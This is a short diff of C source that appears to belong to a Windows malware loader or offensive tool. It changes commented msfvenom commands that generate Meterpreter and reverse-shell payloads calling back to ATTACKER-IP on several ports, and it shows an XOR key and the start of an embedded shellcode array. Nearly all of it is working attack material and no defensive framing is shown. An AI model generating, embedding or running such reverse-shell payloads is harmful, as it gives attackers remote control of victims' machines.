@@ -48,9 +48,9 @@ char XORKey = 'P';
 
 //msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER-IP LPORT=4444 --platform windows -a x86 -f c -v ShellcodeX86
 
-//msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f c -v ShellcodeSpawnNetcat
+//msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f c -v ShellcodeSpawnNetcat
 
-//msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=38524 -f c -v FallBackShell
+//msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=38524 -f c -v FallBackShell
 
 unsigned char ShellcodeX86[] = 
 "\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
